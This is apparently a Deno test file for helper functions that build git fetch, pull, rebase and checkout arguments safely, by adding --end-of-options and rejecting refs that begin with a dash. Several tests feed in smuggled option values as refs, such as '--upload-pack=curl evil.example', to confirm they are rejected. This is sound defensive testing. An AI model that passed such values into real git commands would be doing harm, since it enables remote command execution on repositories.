/**
 * Tests for the ref-taking git argv builders (Issue #3714).
 *
 * Branch/ref names reaching `git fetch`/`pull`/`rebase`/`checkout` are
 * attacker-influenced positionals (PR `headRefName`, `git branch` output, the
 * GitHub API). Without `--end-of-options` a ref beginning with `-` is parsed by
 * git as an option — `--upload-pack=<cmd>` on a fetch is remote command
 * execution. These tests pin both defences: the separator placement and the
 * loud rejection of a dash-leading ref.
 */

import { assertEquals, assertThrows } from "@std/assert";
import {
  assertSafeGitRef,
  buildCheckoutArgs,
  buildCheckoutNewBranchArgs,
  buildFetchArgs,
  buildPullArgs,
  buildRebaseArgs,
} from "../lib/git_ref_args.ts";

Deno.test("buildFetchArgs - separator precedes remote and ref", () => {
  assertEquals(buildFetchArgs("origin", "feature/x"), [
    "fetch",
    "--end-of-options",
    "origin",
    "feature/x",
  ]);
});

Deno.test("buildFetchArgs - omits the ref when none is given", () => {
  assertEquals(buildFetchArgs("origin"), [
    "fetch",
    "--end-of-options",
    "origin",
  ]);
});

Deno.test("buildFetchArgs - separator comes before the first positional", () => {
  const args = buildFetchArgs("origin", "main");
  const sepIndex = args.indexOf("--end-of-options");
  assertEquals(sepIndex, 1);
  assertEquals(args.slice(sepIndex + 1), ["origin", "main"]);
});

Deno.test("buildFetchArgs - rejects a dash-leading ref", () => {
  assertThrows(
    () => buildFetchArgs("origin", "--upload-pack=curl evil.example"),
    Error,
    "must not begin with '-'",
  );
});

Deno.test("buildFetchArgs - rejects a dash-leading remote", () => {
  assertThrows(() => buildFetchArgs("-o", "main"), Error, "must not begin");
});

Deno.test("buildFetchArgs - rejects an empty ref", () => {
  assertThrows(() => buildFetchArgs("origin", ""), Error, "must not be empty");
});

Deno.test("buildCheckoutArgs - separator precedes the ref", () => {
  assertEquals(buildCheckoutArgs("issue-42-fix"), [
    "checkout",
    "--end-of-options",
    "issue-42-fix",
  ]);
});

Deno.test("buildCheckoutArgs - rejects a dash-leading ref", () => {
  assertThrows(() => buildCheckoutArgs("--orphan"), Error, "must not begin");
});

Deno.test("buildCheckoutNewBranchArgs - separator precedes the start point", () => {
  assertEquals(buildCheckoutNewBranchArgs("feature", "origin/main"), [
    "checkout",
    "-b",
    "feature",
    "--end-of-options",
    "origin/main",
  ]);
});

Deno.test("buildCheckoutNewBranchArgs - no start point yields no separator", () => {
  // `-b` consumes the very next argv as its value, so the new-branch name can
  // never be re-parsed as an option; with no start point there is no unguarded
  // positional left to separate.
  assertEquals(buildCheckoutNewBranchArgs("feature"), [
    "checkout",
    "-b",
    "feature",
  ]);
});

Deno.test("buildCheckoutNewBranchArgs - rejects a dash-leading start point", () => {
  assertThrows(
    () => buildCheckoutNewBranchArgs("feature", "--orphan"),
    Error,
    "must not begin",
  );
});

Deno.test("buildCheckoutNewBranchArgs - rejects a dash-leading branch name", () => {
  assertThrows(
    () => buildCheckoutNewBranchArgs("-D", "main"),
    Error,
    "must not begin",
  );
});

Deno.test("buildRebaseArgs - separator precedes the upstream", () => {
  assertEquals(buildRebaseArgs("Develop"), [
    "rebase",
    "--end-of-options",
    "Develop",
  ]);
});

Deno.test("buildRebaseArgs - rejects a dash-leading upstream", () => {
  assertThrows(() => buildRebaseArgs("--autostash"), Error, "must not begin");
});

Deno.test("buildPullArgs - plain pull keeps remote and ref after the separator", () => {
  assertEquals(buildPullArgs("origin", "milestone/v1"), [
    "pull",
    "--end-of-options",
    "origin",
    "milestone/v1",
  ]);
});

Deno.test("buildPullArgs - rebase flag precedes the separator", () => {
  assertEquals(buildPullArgs("origin", "feature", { rebase: true }), [
    "pull",
    "--rebase",
    "--end-of-options",
    "origin",
    "feature",
  ]);
});

Deno.test("buildPullArgs - ffOnly flag precedes the separator", () => {
  assertEquals(buildPullArgs("origin", "feature", { ffOnly: true }), [
    "pull",
    "--ff-only",
    "--end-of-options",
    "origin",
    "feature",
  ]);
});

Deno.test("buildPullArgs - rejects a dash-leading ref", () => {
  // `git pull` consumes `--end-of-options` in its own parser and does not
  // forward it to the internal `git fetch`, so the reject is the only defence
  // that actually holds for pull.
  assertThrows(
    () => buildPullArgs("origin", "--upload-pack=evil"),
    Error,
    "must not begin",
  );
});

Deno.test("assertSafeGitRef - accepts ordinary refs", () => {
  for (
    const ref of [
      "main",
      "origin/main",
      "refs/heads/x",
      "issue-3714-fix",
      "a-b",
    ]
  ) {
    assertSafeGitRef(ref, "test");
  }
});

Deno.test("assertSafeGitRef - error names the rejected value and context", () => {
  const error = assertThrows(
    () => assertSafeGitRef("-rf", "fetch ref"),
    Error,
  );
  assertEquals(error.message.includes("fetch ref"), true);
  assertEquals(error.message.includes("-rf"), true);
});
